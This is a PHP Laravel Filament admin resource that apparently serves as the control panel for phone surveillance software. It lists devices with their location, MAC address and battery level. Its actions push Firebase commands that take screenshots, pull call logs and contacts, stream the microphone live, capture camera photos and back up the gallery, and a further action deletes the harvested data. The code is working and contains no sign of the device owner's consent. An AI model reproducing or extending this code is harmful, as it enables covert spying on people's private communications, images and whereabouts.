<?php

namespace App\Filament\Resources;

use App\Filament\Resources\UserResource\Pages;
use App\Filament\Resources\UserResource\RelationManagers;
use App\Models\User;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class UserResource extends Resource
{
    protected static ?string $model = User::class;

    protected static ?string $navigationIcon = 'heroicon-o-rectangle-stack';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                Forms\Components\Tabs::make('User Details')
                    ->tabs([
                        Forms\Components\Tabs\Tab::make('User Profile')
                            ->icon('heroicon-o-user')
                            ->schema([
                                Forms\Components\TextInput::make('name')
                                    ->required(),
                                Forms\Components\TextInput::make('email')
                                    ->email(),
                                Forms\Components\DateTimePicker::make('email_verified_at'),
                                Forms\Components\TextInput::make('password')
                                    ->password()
                                    ->dehydrated(fn ($state) => filled($state))
                                    ->required(fn (string $context): bool => $context === 'create'),
                            ]),
                        Forms\Components\Tabs\Tab::make('Device Information')
                            ->icon('heroicon-o-device-phone-mobile')
                            ->schema([
                                Forms\Components\TextInput::make('device_id')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('mac_address')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('model')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('location')
                                    ->readOnly(),
                            ]),
                    ])->columnSpanFull(),
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('name')
                    ->searchable()
                    ->weight('bold'),
                Tables\Columns\TextColumn::make('email')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('email_verified_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('created_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('updated_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('device_id')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('mac_address')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('model')
                    ->searchable()
                    ->badge(),
                Tables\Columns\TextColumn::make('location')
                    ->searchable()
                    ->icon('heroicon-o-map-pin'),
                Tables\Columns\TextColumn::make('battery_level')
                    ->label('Battery')
                    ->suffix('%')
                    ->sortable()
                    ->color(fn (string $state): string => match (true) {
                        $state > 50 => 'success',
                        $state > 20 => 'warning',
                        default => 'danger',
                    })
                    ->icon(fn (User $record): string => $record->is_charging ? 'heroicon-s-bolt' : 'heroicon-o-battery-50')
                    ->description(fn (User $record): string => $record->is_charging ? 'Charging' : ''),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\ActionGroup::make([
                    Tables\Actions\EditAction::make(),
                    Tables\Actions\Action::make('request_screenshot')
                        ->label('Request Screenshot')
                        ->icon('heroicon-o-camera')
                        ->action(function (User $record) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'screenshot',
                                'status' => 'pending',
                            ]);
                            if (!$record->fcm_token) {
                                \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->danger()
                                    ->send();
                                return;
                            }
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                if (!file_exists($credentialsPath)) throw new \Exception('Firebase credentials not found');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                    'https://www.googleapis.com/auth/firebase.messaging', $credentialsPath
                                );
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'screenshot', 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Screenshot Requested')->success()->send();
                            } catch (\Exception $e) {
                                \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send();
                            }
                        }),
                    Tables\Actions\Action::make('request_call_log')
                        ->label('Request Call Log')
                        ->icon('heroicon-o-phone')
                        ->action(function (User $record) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'backup_call_log',
                                'status' => 'pending',
                            ]);
                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_call_log', 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Call Log Requested')->success()->send();
                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                        }),
                    Tables\Actions\Action::make('request_contacts')
                        ->label('Request Contacts')
                        ->icon('heroicon-o-users')
                        ->action(function (User $record) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'backup_contacts',
                                'status' => 'pending',
                            ]);
                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_contacts', 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Contacts Requested')->success()->send();
                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                        }),
                    Tables\Actions\Action::make('start_audio_stream')
                        ->label('Start Audio Stream')
                        ->icon('heroicon-o-microphone')
                        ->color('success')
                        ->action(function (User $record) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'start_stream',
                                'status' => 'pending',
                            ]);
                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                            try {
                                $stream = \App\Models\LiveStream::create(['user_id' => $record->id, 'status' => 'active', 'started_at' => now()]);
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'start_stream', 'live_stream_id' => (string)$stream->id, 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Stream Started')->success()->send();
                                return redirect()->to(\App\Filament\Resources\LiveStreamResource::getUrl('view', ['record' => $stream->id]));
                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                        }),
                    Tables\Actions\Action::make('request_photo')
                        ->label('Request Photo')
                        ->icon('heroicon-o-camera')
                        ->form([
                            Forms\Components\Select::make('camera_facing')
                                ->label('Camera')
                                ->options(['back' => 'Back Camera', 'front' => 'Front Camera'])
                                ->default('back')
                                ->required(),
                        ])
                        ->action(function (User $record, array $data) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'capture_image',
                                'status' => 'pending',
                                'payload' => $data,
                            ]);
                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'capture_image', 'camera_facing' => $data['camera_facing'], 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Photo Requested')->success()->send();
                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                        }),
                    Tables\Actions\Action::make('request_gallery_backup')
                        ->label('Request Gallery Backup')
                        ->icon('heroicon-o-photo')
                        ->form([
                            Forms\Components\Select::make('media_type')
                                ->label('Media Type')
                                ->options(['photos' => 'Photos Only', 'videos' => 'Videos Only', 'all' => 'Both'])
                                ->default('all')
                                ->required(),
                        ])
                        ->action(function (User $record, array $data) {
                            $log = \App\Models\CommandLog::create([
                                'user_id' => $record->id,
                                'admin_id' => auth()->id(),
                                'command' => 'backup_gallery',
                                'status' => 'pending',
                                'payload' => $data,
                            ]);
                            if (!$record->fcm_token) { \Filament\Notifications\Notification::make()->title('No FCM Token')->danger()->send(); return; }
                            try {
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials('https://www.googleapis.com/auth/firebase.messaging', $credentialsPath);
                                $token = $credentials->fetchAuthToken();
                                $client = new \GuzzleHttp\Client();
                                $client->post("https://fcm.googleapis.com/v1/projects/{$jsonKey['project_id']}/messages:send", [
                                    'headers' => ['Authorization' => 'Bearer ' . $token['access_token'], 'Content-Type' => 'application/json'],
                                    'json' => ['message' => ['token' => $record->fcm_token, 'data' => ['action' => 'backup_gallery', 'media_type' => $data['media_type'], 'command_id' => (string) $log->id]]],
                                ]);
                                \Filament\Notifications\Notification::make()->title('Gallery Backup Requested')->success()->send();
                            } catch (\Exception $e) { \Filament\Notifications\Notification::make()->title('Failed')->body($e->getMessage())->danger()->send(); }
                        }),
                    Tables\Actions\Action::make('clean_data')
                        ->label('Clean Data')
                        ->icon('heroicon-o-trash')
                        ->color('danger')
                        ->form([
                            Forms\Components\CheckboxList::make('data_types')
                                ->label('Select Data to Delete')
                                ->options(['photos' => 'Photos', 'videos' => 'Videos', 'audio' => 'Audio', 'call_logs' => 'Call Logs', 'contacts' => 'Contacts', 'sms' => 'SMS'])
                                ->required(),
                        ])
                        ->action(function (User $record, array $data) {
                            $count = 0;
                            foreach ($data['data_types'] as $type) {
                                if (in_array($type, ['photos', 'videos', 'audio'])) {
                                    $mime = match($type) { 'photos' => 'image/%', 'videos' => 'video/%', 'audio' => 'audio/%' };
                                    foreach ($record->media()->where('file_type', 'like', $mime)->get() as $item) { \Illuminate\Support\Facades\Storage::disk('public')->delete($item->file_path); $item->delete(); $count++; }
                                } else {
                                    $map = ['call_logs' => 'call_log', 'contacts' => 'contacts', 'sms' => 'sms'];
                                    if (isset($map[$type])) $count += $record->backups()->where('type', $map[$type])->delete();
                                }
                            }
                            \Filament\Notifications\Notification::make()->title('Data Cleaned')->body("Deleted {$count} items.")->success()->send();
                        }),
                    Tables\Actions\DeleteAction::make(),
                ])
                ->icon('heroicon-m-ellipsis-vertical')
                ->tooltip('Actions'),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            RelationManagers\MediaRelationManager::class,
            RelationManagers\BackupsRelationManager::class,
            RelationManagers\DeviceLogsRelationManager::class,
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListUsers::route('/'),
            'create' => Pages\CreateUser::route('/create'),
            'edit' => Pages\EditUser::route('/{record}/edit'),
        ];
    }
}
